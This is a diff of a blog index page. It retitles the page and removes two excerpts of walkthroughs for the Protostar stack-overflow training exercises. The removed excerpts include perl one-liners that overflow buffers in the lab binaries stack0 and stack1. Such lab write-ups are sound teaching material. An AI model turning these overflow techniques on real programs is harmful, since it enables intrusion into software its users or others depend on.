@@ -36,11 +36,11 @@
 
 		
 	
-	Protostar Stack Exploits (Solutions 4-5)
+	Nebula Shell Exploits (Solutions 15-19)
 	
 
           Overview
-Proto...">
+This i...">
 	
 
   <!-- http://t.co/dKP3o1e -->
@@ -125,111 +125,6 @@ Proto...">
 			<div class="mid-col-container">
 				<div id="content" class="inner"><div class="blog-index">
   
-  
-
-      
-  
-    <article>
-      
-	<div class="meta">
-		<div class="date">
-
-
-
-
-
-
-
-
-
-<time datetime="2012-08-24T00:00:00+03:00" data-updated="true" itemprop="datePublished"></time></div>
-		<div class="tags">
-
-
-	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
-
-
-</div>
-		
-	</div>
-	<h1 class="title" itemprop="name"><a href="/blog/2012/08/24/protostar-stack1/" itemprop="url">Protostar Stack Exploits (Solutions 4-5)</a></h1>
-	<div class="entry-content" itemprop="articleBody">
-
-          <h1 id="overview">Overview</h1>
-<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
-
-<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>
-
-<h1 id="solutions">Solutions</h1>
-<h2 id="stack-level-4">Stack: Level 4</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>
-
-<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code class="language-plaintext highlighter-rouge">main</code>.</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gdb ./stack4</code></pre></figure>
-
-
-		<a href="/blog/2012/08/24/protostar-stack1/" class="more-link">Read more</a>
-	</div>
-
-
-    </article>
-  
-
-      
-  
-    <article>
-      
-	<div class="meta">
-		<div class="date">
-
-
-
-
-
-
-
-
-
-<time datetime="2012-08-18T00:00:00+03:00" data-updated="true" itemprop="datePublished"></time></div>
-		<div class="tags">
-
-
-	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
-
-
-</div>
-		
-	</div>
-	<h1 class="title" itemprop="name"><a href="/blog/2012/08/18/protostar-stack0/" itemprop="url">Protostar Stack Exploits (Solutions 0-3)</a></h1>
-	<div class="entry-content" itemprop="articleBody">
-
-          <h1 id="overview">Overview</h1>
-<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
-
-<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>
-
-<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>
-
-<h1 id="solutions">Solutions</h1>
-<h2 id="stack-level-0">Stack: Level 0</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x65"</span> | ./stack0
-<span class="go">you have changed the 'modified' variable</span></code></pre></figure>
-
-<h2 id="stack-level-1">Stack: Level 1</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./stack1 <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x64 . dcba"</span><span class="si">)</span>
-<span class="go">you have correctly got the variable to the right value</span></code></pre></figure>
-
-
-		<a href="/blog/2012/08/18/protostar-stack0/" class="more-link">Read more</a>
-	</div>
-
-
-    </article>
   
 
       
